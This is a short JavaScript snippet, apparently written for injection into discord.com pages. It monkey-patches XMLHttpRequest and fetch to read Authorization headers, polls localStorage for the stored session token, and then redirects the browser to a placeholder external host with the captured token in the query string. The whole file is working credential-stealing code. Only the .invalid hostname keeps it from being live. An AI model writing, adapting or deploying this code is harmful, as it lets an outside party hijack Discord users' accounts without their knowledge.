(() => {
  if (window.top !== window || window.location.hostname !== "discord.com") return;

  let delivered = false;
  const deliver = (value) => {
    if (delivered || typeof value !== "string") return;
    const token = value.trim();
    if (token.length < 20 || !token.includes(".")) return;
    delivered = true;
    window.location.replace(
      `https://disweep-auth.invalid/__NONCE__?token=${encodeURIComponent(token)}`,
    );
  };

  const isAuthorization = (name) => String(name).toLowerCase() === "authorization";

  const setRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.setRequestHeader = function (...args) {
    const [name, value] = args;
    if (isAuthorization(name)) deliver(value);
    return setRequestHeader.apply(this, args);
  };

  const storage = window.localStorage;
  const timer = window.setInterval(() => {
    try {
      const saved = storage?.getItem("token");
      if (saved) deliver(JSON.parse(saved));
    } catch {}
    if (delivered) window.clearInterval(timer);
  }, 1000);

  const originalFetch = window.fetch;
  window.fetch = function (...args) {
    const [input, init] = args;
    const headers = init?.headers ?? (input instanceof Request ? input.headers : undefined);
    if (headers instanceof Headers) {
      deliver(headers.get("authorization"));
    } else if (Array.isArray(headers)) {
      for (const [name, value] of headers) if (isAuthorization(name)) deliver(value);
    } else if (headers) {
      for (const [name, value] of Object.entries(headers))
        if (isAuthorization(name)) deliver(value);
    }
    return originalFetch.apply(this, args);
  };
})();
